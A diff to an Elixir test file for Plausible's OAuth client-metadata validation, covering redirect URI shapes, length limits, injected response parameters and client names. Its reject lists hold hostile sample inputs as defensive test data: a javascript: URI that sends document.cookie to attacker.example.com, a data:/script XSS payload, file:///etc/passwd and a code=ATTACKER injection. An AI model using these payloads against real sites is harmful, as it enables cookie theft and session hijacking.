@@ -93,17 +93,23 @@ defmodule Plausible.OAuth.CIMDTest do
   end
 
   describe "validate_redirect_uris/1" do
-    test "accepts the redirect_uri shapes RFC 8252 section 7 defines" do
+    test "accepts `https` scheme uris and `http` scheme uris when they are loopback hosts" do
       for uri <- [
             @redirect_uri,
             "http://127.0.0.1:1234/callback",
             "http://localhost/callback",
-            "http://[::1]:8080/callback",
-            "com.example.app:/oauth2redirect",
-            "https://client.example.com/" <> String.duplicate("a", 2048 - 27)
+            "http://[::1]:8080/callback"
           ] do
         assert :ok = CIMD.validate_redirect_uris([uri])
       end
+    end
+
+    test "enforces max length" do
+      base = "https://client.example.com/"
+      max = String.duplicate("a", 2048 - String.length(base))
+      over_max = String.duplicate("a", 2048 + 1 - String.length(base))
+      assert :ok = CIMD.validate_redirect_uris([base <> max])
+      assert {:error, :invalid_redirect_uris} = CIMD.validate_redirect_uris([base <> over_max])
     end
 
     test "requires a non-empty list" do
@@ -117,17 +123,34 @@ defmodule Plausible.OAuth.CIMDTest do
             "javascript:fetch('https://attacker.example.com/'+document.cookie)",
             "data:text/html,<script>alert(1)</script>",
             "vbscript:msgbox",
+            "com.example.app:/oauth2redirect",
             "file:///etc/passwd",
             "http://client.example.com/callback",
             "https://user:pass@client.example.com/callback",
             "https://client.example.com/callback#frag",
             "/callback",
             "",
-            42,
-            "https://client.example.com/" <> String.duplicate("a", 2049 - 27)
+            42
           ] do
         assert {:error, :invalid_redirect_uris} = CIMD.validate_redirect_uris([uri])
       end
+    end
+
+    test "rejects a redirect_uri that already carries a response parameter" do
+      assert {:error, _} =
+               Plausible.OAuth.CIMD.validate_redirect_uris([
+                 "https://client.example.com/callback?code=ATTACKER"
+               ])
+    end
+
+    test "rejects every response parameter name, and keeps an unrelated query" do
+      for name <- ~w(code state error error_description iss) do
+        assert {:error, :invalid_redirect_uris} =
+                 CIMD.validate_redirect_uris(["https://client.example.com/callback?#{name}=x"])
+      end
+
+      assert :ok =
+               CIMD.validate_redirect_uris(["https://client.example.com/callback?tenant=acme"])
     end
 
     test "rejects the whole list when any one entry is unusable" do
@@ -137,8 +160,17 @@ defmodule Plausible.OAuth.CIMDTest do
   end
 
   describe "validate_client_name/1" do
-    test "accepts an absent name, non-ASCII text and internal spaces" do
-      for name <- [nil, "Claude Code", "Café Auswärts", "分析クライアント", String.duplicate("N", 255)] do
+    test "accepts an absent name, non-ASCII text, right to left names, and internal spaces" do
+      for name <- [
+            nil,
+            "Claude Code",
+            "Café Auswärts",
+            # "analysis client" in Japanese
+            "分析クライアント",
+            # "analysis app 100" in Arabic (RTL)
+            "تطبيق تحليل 100",
+            String.duplicate("N", 255)
+          ] do
         assert :ok = CIMD.validate_client_name(name)
       end
     end
